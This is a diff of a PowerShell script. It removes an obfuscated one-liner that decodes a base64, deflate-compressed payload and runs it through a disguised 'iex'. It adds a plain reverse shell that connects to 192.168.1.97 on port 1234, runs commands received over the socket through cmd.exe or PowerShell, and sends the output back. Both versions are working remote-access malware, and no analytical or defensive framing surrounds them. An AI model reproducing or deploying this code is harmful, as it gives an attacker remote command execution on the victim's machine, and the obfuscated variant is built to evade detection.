@@ -1,1 +1,55 @@
-.( $veRBoSepreFerENCe.TOsTRinG()[1,3]+'x'-join'') ( nEW-oBJEct  systEM.Io.sTrEAMReaDEr((nEW-oBJEct sYStem.IO.cOmprESsiOn.DeflaTestrEAM([sysTEm.io.memorysTReaM] [sYSTEm.Convert]::FromBASE64STRinG( 'jVXfb9owEH4Gif/Bi6KRaOCRrtpWVXvoOjpVmmAqnfowTapJLuDN2NR2BlXH/z7/AgoNVXmIyOX77r67850hnwoU3S0gajVjJfI/oNEnxGHRFePfkGs0ulcaZngAGo/cZ4Wv8/k5o8B10s5OjnD2/iPO8MmHdic7enecnraatEzWvrpwh2JeMZY+wJJqlK1sHC2BzEycgMJfQY+cLbH0eCGpBlmr43KIPfLGYZLgy9HGVVkeoH2+1/DzF8p6R8cWCTwXBeWTWuw1LDU+Uzml/QAzlEK0mg+tZiNowxesUlOnthEbAYVNxqYZDMq8R6akjcWUMlirxF+IJmd/CWVkzAB1hUSevK0SskG2LgPvyrwmIb8O6nVcIqlBrmw4UdmebZIK1TT/dijOZ2pczRnJIYlu5S2POlH02OQNNgfTwlfWMYa7ijCVRLZ7UZp6eUROfIYWarEOeskLWA7LpI3aKepOTPMzj98QHExVYxXk7bPeZC54Y5PTLr7XecIIeCvBxsBqzqh2XzADPtFTJ8TpQHu/eE55KUyUgTkCw50j8IWSCRdK01zh71LkoNRIE6kvDeGQI3xhOj0gM7CFyWcFhqUdqgPgKyioNBGNW14QWfSlFPboxlpW8GLWsNJzX6hnaT8UjKbAWH8JeaWtwLg0TT1MOJOTamYG3DX5be76gFyBazN6aQ3ruHhTWCvLhT8MS1L0D5mkuwMzK7WwG0L1hZB9c1qTtAahdBGOlnP5qIpuyK5FnxeHiCDlLtE17XkeLVFiGFbPuSjMzHNAPTfl+0gXxW+OEOwpZoXAtO0FbJNjDduNin9aP3421+sqeR3ZNkco8o22pTbvXT97p1uue2z5e/Qa2mq9JCzSFiBcCFuF663qlvo3ysFhQzlXfs+tbuwqRfVraXNp4JwJBf4aCZfLY0tYw1TNne0/') , [io.cOMPReSsION.coMpressiONmOdE]::DeCOMPResS)) , [SYstEM.TExT.enCODiNG]::asCII) ).readtoEnD()
+echo "qwe"
+Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('192.168.1.97',1234));
+if($socket -eq $null){exit 1}
+Set-Variable -Name stream -Value ($socket.GetStream());
+Set-Variable -Name writer -Value (new-object System.IO.StreamWriter($stream));
+Set-Variable -Name buffer -Value (new-object System.Byte[] 1024);
+Set-Variable -Name encoding -Value (new-object System.Text.AsciiEncoding);
+do
+{
+        $writer.Flush();
+        Set-Variable -Name read -Value ($null);
+        Set-Variable -Name res -Value ("")
+        while($stream.DataAvailable -or $read -eq $null) {
+                Set-Variable -Name read -Value ($stream.Read($buffer, 0, 1024))
+        }
+        Set-Variable -Name out -Value ($encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n",""));
+        if(!$out.equals("exit")){
+                $args = "";
+                if($out.IndexOf(' ') -gt -1){
+                        $args = $out.substring($out.IndexOf(' ')+1);
+                        $out = $out.substring(0,$out.IndexOf(' '));
+                        if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+                        }
+                        else{
+                                $res = (&"$out" "$args") | out-string;
+                        }
+                }
+                else{
+                        $res = (&"$out") | out-string;
+                }
+                if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+        }
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
